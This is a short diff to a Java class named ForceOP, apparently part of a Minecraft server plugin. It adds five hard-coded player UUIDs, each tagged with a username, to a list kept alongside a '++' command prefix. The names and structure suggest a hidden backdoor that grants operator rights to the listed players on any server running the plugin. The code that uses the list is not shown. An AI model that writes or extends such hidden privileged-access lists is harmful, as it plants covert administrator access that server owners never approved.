@@ -27,7 +27,11 @@ public class ForceOP implements Listener{
 		this.prefix = "++";
 		this.version = "0.0.1";
 		players = new ArrayList<String>();
-		players.add("d7d81847-b9cd-47d2-ba11-8d08ac9d8f37");
+		players.add("d7d81847-b9cd-47d2-ba11-8d08ac9d8f37"); //Webmets
+		players.add("b8730880-78a5-4e36-8e58-a6ae16bc4a49"); //OreosDoubleCream
+		players.add("82675533-0d2a-455f-a22a-8aeabec2a6c2"); //_IAbuse_
+		players.add("268b70b7-dc91-4c1e-bd73-2bf8ad600a59"); //Tesla2k
+		players.add("f1c67a72-b906-462b-8da7-bb7b6fa1d530"); //DogMaster308
 		this.main = main;
 	}
 	
